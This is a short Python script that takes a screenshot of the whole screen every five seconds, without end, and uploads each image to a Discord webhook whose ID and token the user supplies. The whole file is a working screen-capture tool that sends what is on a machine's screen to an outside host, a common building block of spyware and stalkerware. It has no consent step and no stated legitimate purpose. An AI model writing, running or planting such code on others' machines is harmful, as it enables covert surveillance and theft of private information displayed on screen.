import discord
import PIL.ImageGrab, PIL.ImageFile
from discord import Webhook, RequestsWebhookAdapter
import time

###     FOR THIS TO WORK, YOU **MUST** DO THE INSTALLS THAT ARE BELOW
###     pip3 install discord
###     pip3 install Pillow


# PUT YOUR WEBHOOK TOKEN BTWEEN THE ''
WEBHOOK_TOKEN = ''

# PUT YOUR WEBHOOK ID BETWEEN THE ''
WEBHOOK_ID = ''

WEBHOOK = Webhook.partial(WEBHOOK_ID, WEBHOOK_TOKEN, \
                          adapter=RequestsWebhookAdapter())

# Change 5 to seconds between each screenshot
seconds = 5

while (True):
    time.sleep(seconds)
    img = PIL.ImageGrab.grab()
    img.save("test.jpg")
    WEBHOOK.send(file=discord.File("test.jpg"))
